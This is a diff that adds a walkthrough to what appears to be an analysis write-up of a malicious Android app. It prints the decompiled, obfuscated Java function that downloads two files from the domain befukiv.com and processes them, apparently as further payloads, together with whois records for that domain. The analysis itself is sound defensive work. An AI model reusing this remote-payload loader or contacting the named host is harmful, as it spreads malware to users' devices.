@@ -64,6 +64,62 @@ From this, the most important file is the _classes.dex_ file, from which we can 
 jadx -d out classes.dex
 ```
 
+## Walkthrough
+### Exploring Application External Accesses
+
+Given that the application contains malware, it's probable that at some point it downloads additional files from external services. We decided to search the codebase for URLs in the 'https://' format. And we found the following Java function.
+
+```
+    public static void a() {
+        String str;
+        y4.p pVar = new y4.p();
+        r.a aVar = new r.a();
+        aVar.c("https://befukiv.com/muchaspuchas");
+        y4.r a7 = aVar.a();
+        r.a aVar2 = new r.a();
+        aVar2.c("https://befukiv.com/cortina");
+        y4.r a8 = aVar2.a();
+        try {
+            y4.t tVar = new y4.d(pVar, a7).a().f6804g;
+            byte[] b2 = tVar.b();
+            y4.o e7 = tVar.e();
+            Charset charset = z4.h.f6957c;
+            if (e7 != null && (str = e7.f6764b) != null) {
+                charset = Charset.forName(str);
+            }
+            f3837g.set(new String(b2, charset.name()).split("\\|"));
+            byte[] b7 = new y4.d(pVar, a8).a().f6804g.b();
+            if (f3839i.get()) {
+                return;
+            }
+            f3838h.getClass();
+            g6.i.h(b7);
+            f3839i.set(true);
+        } catch (Throwable th) {
+            th.printStackTrace();
+        }
+    }
+```
+
+Although it's obfuscated, we can see that it's accessing files from the domain befukiv.com. A DNS search reveals that this domain has two name servers pointing to domains in Russia.
+
+```
+...
+Registrant Email: http://whois.nicenic.net/?page=whoisform
+Admin Email: http://whois.nicenic.net/?page=whoisform&emailtype=admin
+Tech Email: http://whois.nicenic.net/?page=whoisform&emailtype=tech
+Name Server: NS1.ERANS.RU
+Name Server: NS2.ERANS.RU
+DNSSEC: unsigned
+...
+```
+
+At the time this report is being written, the server is accessible, but the resources are not available (it returns a 'not found' response).
+
+But we have access to these files as they were previously downloaded, so it's possible to continue our analysis.
+
+### Exploring 'muchaspuchas' and 'cortina' files
+
 ## Exploring readable files
 
 TODO
